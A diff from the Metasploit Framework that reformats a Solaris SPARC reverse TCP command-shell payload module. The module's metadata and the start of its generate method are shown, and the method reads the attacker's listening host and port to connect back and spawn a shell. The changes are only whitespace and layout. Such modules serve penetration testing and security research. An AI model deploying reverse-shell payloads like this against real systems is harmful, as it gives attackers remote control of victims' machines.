@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = 144
 
   include Msf::Payload::Single
@@ -13,21 +11,24 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-      'Name'          => 'Solaris Command Shell, Reverse TCP Inline',
-      'Description'   => 'Connect back to attacker and spawn a command shell',
-      'Author'        => 'vlad902',
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'solaris',
-      'Arch'          => ARCH_SPARC,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::CommandShell
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Solaris Command Shell, Reverse TCP Inline',
+        'Description' => 'Connect back to attacker and spawn a command shell',
+        'Author' => 'vlad902',
+        'License' => MSF_LICENSE,
+        'Platform' => 'solaris',
+        'Arch' => ARCH_SPARC,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell
+      )
+    )
   end
 
   def generate
-    port    = (datastore['LPORT'] || '0').to_i
-    host    = nil
+    port = (datastore['LPORT'] || '0').to_i
+    host = nil
     begin
       host = Rex::Socket.resolv_nbo_i(datastore['LHOST'] || '127.0.0.1')
     rescue SocketError
